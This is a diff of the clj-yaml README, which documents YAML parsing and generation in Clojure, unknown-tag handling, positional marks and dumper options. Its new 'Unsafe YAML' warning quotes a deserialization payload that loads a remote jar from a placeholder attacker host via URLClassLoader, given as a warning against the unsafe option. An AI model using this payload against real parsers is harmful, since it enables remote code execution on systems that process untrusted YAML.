@@ -2,6 +2,8 @@
 // DO NOT EDIT: the lib-version parameter is automatically updated by bb publish
 :lib-version: 0.7.169
 :project-coords: clj-commons/clj-yaml
+:toc-level: 4
+:toc: macro
 
 Provides http://yaml.org[YAML] encoding and decoding for Clojure via the https://bitbucket.org/snakeyaml/snakeyaml[snakeyaml] Java library.
 
@@ -14,7 +16,23 @@ https://clojurians.slack.com/archives/C042XAQFCCU[image:https://img.shields.io/b
 
 (This is a maintained fork of https://github.com/CircleCI-Archived/clj-yaml[the circleci fork] which forked from https://github.com/lancepantz/clj-yaml[the original])
 
+toc::[]
+
 == Usage
+
+=== Internal vs Public API
+
+When the clj-commons/clj-yaml team adopted clj-yaml it made some assumptions about the clj-yaml public API.
+It turns out folks are using more of clj-yaml than we originally expected.
+
+We encourage you to stick to the higher level functions as documented in the `clj-yaml.core` namespace.
+
+If you do find yourself needing to use the lower level functions, please let us know.
+Perhaps you are doing so to overcome a limitation in clj-yaml that we could address to everyone's benefit.
+
+Note that babashka only exposes the higher level functions.
+
+=== Parsing
 
 [source,clojure]
 ----
@@ -23,26 +41,28 @@ https://clojurians.slack.com/archives/C042XAQFCCU[image:https://img.shields.io/b
 (yaml/generate-string
   [{:name "John Smith", :age 33}
    {:name "Mary Smith", :age 27}])
-"- {name: John Smith, age: 33}\n- {name: Mary Smith, age: 27}\n"
+;; => "- {name: John Smith, age: 33}\n- {name: Mary Smith, age: 27}\n"
 
 (yaml/parse-string "
 - {name: John Smith, age: 33}
 - name: Mary Smith
   age: 27
 ")
-=> ({:name "John Smith", :age 33}
-    {:name "Mary Smith", :age 27})
+;; => ({:name "John Smith", :age 33}
+;      {:name "Mary Smith", :age 27})
 ----
 
-By default, keys are converted to clojure keywords. To prevent this, add `:keywords false` parameters to the `parse-string` function:
+By default, YAML keys are converted to clojure keywords. To prevent this, add `:keywords false` parameters to the `parse-string` function:
 
 [source,clojure]
 ----
 (yaml/parse-string "
 - {name: John Smith}
 " :keywords false)
+;; => ({"name" "John Smith"})
 ----
 
+==== Unknown tags [[unknown-tags]]
 Unknown tags can be handled by passing a handler function via the
 `:unknown-tag-fn` parameter. The handler function is provided a map which
 includes `:tag` and `:value` keys. Note that the value passed to the
@@ -51,9 +71,11 @@ lack thereof) of the scalar value.
 
 [source,clojure]
 ----
-;; drop tags
+;; drop unknown tags
 (yaml/parse-string "!Base12 10" :unknown-tag-fn :value
 ;; => "10"
+
+;; or do some smart convertion
 (yaml/parse-string "!Base12 10"
                    :unknown-tag-fn (fn [{:keys [tag value]}]
                                       (if (= "!Base12" tag)
@@ -62,11 +84,102 @@ lack thereof) of the scalar value.
 ;; => 12
 ----
 
-Different flow styles (`:auto`, `:block`, `:flow`) allow customization of how YAML is rendered:
+==== Unsafe YAML [[unsafe]]
+Clj-yaml optionally supports the creation of Java classes.
+This is considered unsafe.
+
+IMPORTANT: Be very wary of specifying `:unsafe true` unless you completely trust your YAML inputs.
+Consider instead using `:unknown-tag-fn` for fine and deliberate control.
+
+An example of some malicious YAML is https://j0vsec.com/post/cve-2021-25738/[well described by J0VSEC].
+Here's the dangerous snippit described:
+
+[source, yaml]
+----
+some_var: !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker-server.tld/poc.jar"]]]]
+----
+
+Also security related are `:allow-recursive-keys` and `:max-aliases-for-collections` options.
+
+==== Positional Data [[mark]]
+You can ask clj-yaml to return parsed YAML with extra positional data markers.
 
 [source,clojure]
 ----
+(def some-yaml )
+
+(yaml/parse-string "
+- name: Mary Smith
+  age: 27
+" :mark true)
+;; => {:start {:line 1, :index 1, :column 0},
+;;     :end {:line 3, :index 30, :column 0},
+;;     :unmark
+;;     ({:start {:line 1, :index 3, :column 2},
+;;       :end {:line 3, :index 30, :column 0},
+;;       :unmark
+;;       {{:start {:line 1, :index 3, :column 2},
+;;         :end {:line 1, :index 7, :column 6},
+;;         :unmark "name"}
+;;        {:start {:line 1, :index 9, :column 8},
+;;         :end {:line 1, :index 19, :column 18},
+;;         :unmark "Mary Smith"},
+;;        {:start {:line 2, :index 22, :column 2},
+;;         :end {:line 2, :index 25, :column 5},
+;;         :unmark "age"}
+;;        {:start {:line 2, :index 27, :column 7},
+;;         :end {:line 2, :index 29, :column 9},
+;;         :unmark 27}}})}
+----
+
+In reality, the `:start` `:end` and `:unmark` maps are internally a record and can be recognized via `marked?` and unwrapped via `unmark`.
+
+=== Generating
+
+==== Dumper Options [[dumper-options]]
+Different flow styles (`:auto`, `:block`, `:flow`) allow customization of how YAML is rendered.
+
+To demonstrate let's setup `some-data` to play with.
+
+[source,clojure]
+----
+(def some-yaml "
+todo:
+  - name: Fix issue
+    responsible:
+      name: Rita
+")
+
+(def some-data (yaml/parse-string some-yaml))
+----
+
+To select the `:block` flow style:
+[source,clojure]
+----
 (yaml/generate-string some-data :dumper-options {:flow-style :block})
+----
+
+results in a string of YAML, that when printed:
+[source,yaml]
+----
+todo:
+- name: Fix issue
+  responsible:
+    name: Rita
+----
+
+The same but with the `:flow` style results in:
+[source,yaml]
+----
+{todo: [{name: Fix issue, responsible: {name: Rita}}]}
+----
+
+And finally the `:auto` style (the default) renders:
+[source,yaml]
+----
+todo:
+- name: Fix issue
+  responsible: {name: Rita}
 ----
 
 Use the `:indent` (default: `2`) and `:indicator-indent` (default: `0`) options to adjust indentation:
@@ -76,21 +189,29 @@ Use the `:indent` (default: `2`) and `:indicator-indent` (default: `0`) options 
 (yaml/generate-string some-data :dumper-options {:indent 6
                                                  :indicator-indent 3
                                                  :flow-style :block})
-=>
+----
+
+results in:
+[source,yaml]
+----
 todo:
    -  name: Fix issue
       responsible:
             name: Rita
 ----
 
-`:indent` must always be larger than `:indicator-indent`. If only 1 higher, the indicator will be on a separate line:
+`:indent` must always be larger than `:indicator-indent`.
+If only 1 higher, the indicator will be on a separate line:
 
 [source,clojure]
 ----
 (yaml/generate-string some-data :dumper-options {:indent 2
                                                  :indicator-indent 1
                                                  :flow-style :block})
-=>
+----
+outputs:
+[source,yaml]
+----
 todo:
  -
   name: Fix issue
@@ -116,6 +237,22 @@ todo:
 clj-commons/clj-yaml {:mvn/version "{lib-version}"}
 ----
 
+=== Use as git dependency
+
+To get the latest changes that are not yet released to Clojars, you can use this library as a git dependency:
+
+[source,clojure]
+----
+$ cat deps.edn
+{:deps {clj-commons/clj-yaml {:git/url "https://github.com/clj-commons/clj-yaml"
+                              :git/sha "05eaca35c34c092ffdd2e620ef07962ce147a88b"}}}
+
+$ clj -X:deps prep
+$ clj -M -e "(require '[clj-yaml.core :as yaml])"
+----
+
+Replace the `:git/sha` value as appropriate.
+
 == Development
 
 We use babashka tasks.
@@ -132,20 +269,6 @@ $ git clone git://github.com/clj-commons/clj-yaml.git
 $ bb download-deps
 $ bb compile-java
 $ bb test
-----
-
-== Use as git dependency
-
-To get the latest changes that are not yet released to Clojars, you can use this library as a git dependency:
-
-[source,clojure]
-----
-$ cat deps.edn
-{:deps {clj-commons/clj-yaml {:git/url "https://github.com/clj-commons/clj-yaml"
-                              :git/sha "05eaca35c34c092ffdd2e620ef07962ce147a88b"}}}
-
-$ clj -X:deps prep
-$ clj -M -e "(require '[clj-yaml.core :as yaml])"
 ----
 
 == People
